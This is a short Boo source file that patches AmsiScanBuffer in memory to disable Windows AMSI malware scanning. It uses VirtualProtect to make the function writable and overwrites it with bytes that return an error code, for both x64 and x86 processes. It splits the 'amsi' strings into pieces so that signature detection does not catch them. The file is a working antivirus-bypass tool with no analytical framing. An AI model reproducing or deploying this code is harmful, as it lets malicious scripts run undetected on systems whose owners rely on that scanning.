import System
import System.Runtime.InteropServices

[DllImport("kernel32.dll", SetLastError: true, CharSet: CharSet.Unicode)]
public static def LoadLibrary(lpFileName as string) as IntPtr:
    pass

[DllImport("kernel32.dll", CharSet: CharSet.Ansi, ExactSpelling: true, SetLastError: true)]
public static def GetProcAddress(hModule as IntPtr, procName as string) as IntPtr:
    pass

[DllImport("kernel32.dll")]
public static def VirtualProtect(lpAddress as IntPtr, dwSize as int, flNewProtect as uint, ref lpflOldProtect as IntPtr) as bool:
    pass

public static def Main():
    patch as (byte)
    if IntPtr.Size == 8:
        print "In x64 process"
        patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
    else:
        print "In x86 process"
        patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])

    try:
        library = LoadLibrary("am"+"si.dll")
        print "library: $(library)"
        address = GetProcAddress(library, "Am"+"si"+"Sc"+"anBuffer")
        print "address: $(address)"

        oldProtect as IntPtr = 0
        r = VirtualProtect(address, patch.Length, 0x40, oldProtect)
        print("oldProtect: $(oldProtect)")
        print("VirtualProtect: $(r)")

        Marshal.Copy(patch, 0, address, patch.Length)
        print "AMSI is now disabled!"
    except:
        print "Could not disable AMSI!"
